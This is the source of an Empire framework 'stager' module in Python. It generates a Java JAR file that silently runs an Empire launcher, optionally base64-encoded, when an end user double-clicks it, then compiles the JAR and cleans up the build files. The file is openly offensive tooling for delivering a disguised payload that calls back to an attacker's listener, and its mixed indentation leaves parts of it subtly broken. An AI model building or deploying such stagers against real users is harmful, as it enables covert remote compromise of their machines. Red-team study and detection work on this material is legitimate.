#Jar file stager for Empire
from lib.common import helpers
import subprocess

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'JAR',

            'Author': ['Andrew @ch33kyf3ll0w Bonstrom'],

            'Description': ('Generates a Jar file.'),

            'Comments': ['Assuming Java is installed, end users can double click to execute.']
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFileName' : {
                'Description'   :   'Name of Jar file.',
                'Required'      :   True,
                'Value'         :   'launcher'
            },
            'OutDirName' : {
                'Description'   :   'Directory to output compiled Jar file to.',
                'Required'      :   True,
                'Value'         :   '/tmp/'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
	directoryName = self.options['OutDirName']['Value']
	fileName = self.options['OutFileName']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
	elif directoryName[-1] != "/":
            print helpers.color("[!] Error in OutDir Value. Please specify path like '/tmp/'")
            return ""
	else:
	#Create initial Java String with placeholder
		javaCode = '''import java.io.*;

    public class fileName
    {
        public static void main(String args[])
        {
            try
            {
                Process p=Runtime.getRuntime().exec("launcher");
            }
            catch(IOException e1) {}}}			
'''
 
		#Replace String placeholder with launcher
		javaCode = javaCode.replace("launcher", launcher).replace("fileName", fileName)
		#Create Java and Manifest.txt files for compiling
		with open(directoryName + fileName + ".java", "w") as javaFile:
			javaFile.write(javaCode)
		with open(directoryName + "manifest.txt", "w") as manifestFile:
			manifestFile.write('Main-Class: ' + fileName + '\n')
		#Create necessary directory structure, move files into appropriate place, compile, and delete unncessary left over content
		proc = subprocess.call("cd "+ directoryName + "&&javac fileName.java&&jar -cvfm fileName.jar manifest.txt fileName.class&&rm -f fileName.class manifest.txt fileName.java".replace ("fileName", fileName, 5), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		
        return "Your file " + fileName + ".jar was successfully generated and placed within " + directoryName +"."
